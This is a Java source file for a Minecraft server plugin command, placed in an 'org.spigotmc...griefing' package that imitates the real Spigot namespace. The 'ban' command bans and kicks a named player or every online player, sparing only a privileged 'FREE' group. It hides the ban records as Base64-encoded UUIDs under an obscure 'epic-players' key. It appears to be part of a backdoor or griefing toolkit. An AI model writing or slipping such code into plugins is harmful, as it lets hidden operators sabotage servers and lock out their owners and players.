package org.spigotmc.commands.impl.griefing;

import java.util.Base64;

import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.entity.Player;
import org.spigotmc.Main;
import org.spigotmc.commands.CommandListener;
import org.spigotmc.commands.annotation.CommandInfo;
import org.spigotmc.manager.DataManager;
import org.spigotmc.manager.PlayerManager;
import org.spigotmc.methods.API;
import org.spigotmc.enums.PlayerType;
import org.spigotmc.utils.Settings;

@CommandInfo (
	name = "ban",
	usage = "ban <player> | ban *",
	desc = "Ban players or player",
	blatant = true
)
public class Ban extends CommandListener {

    @Override
    public void execute(Main plugin, Player p, String[] args) {

		if (args.length <= 1) {
			p.sendMessage(Settings.USAGE(Ban.class.getAnnotation(CommandInfo.class).usage()));
		} else {
			if (args[1].equals("*")) {
				for (Player a : Bukkit.getOnlinePlayers()) {
					if (!PlayerManager.isPlayerInType(PlayerType.FREE, a.getName())) {
						byte[] add = Base64.getEncoder().encode(a.getUniqueId().toString().getBytes());
						
						DataManager.banList.add(new String(add));
						DataManager.getData().set("epic-players", DataManager.banList);
						DataManager.saveData();
						API.kickPlayer(a);
					}
				}
				p.sendMessage(Settings.PREFIX("Everyone was banned!"));
			} else {
				@SuppressWarnings("deprecation")
				OfflinePlayer target = Bukkit.getServer().getPlayer(args[1]);
				if (target == null) {
					p.sendMessage(Settings.PREFIX("The player " + Settings.PURPLE + args[1] + Settings.WHITE + " doesn't seem to exist."));
				} else {
					byte[] add = Base64.getEncoder().encode(target.getUniqueId().toString().getBytes());
					
					DataManager.banList.add(new String(add));
					DataManager.getData().set("epic-players", DataManager.banList);
					DataManager.saveData();
					API.kickPlayer(target.getPlayer());
					p.sendMessage(Settings.PREFIX(target.getName() + " was banned!"));
				}
			}
        }
    }
}

    
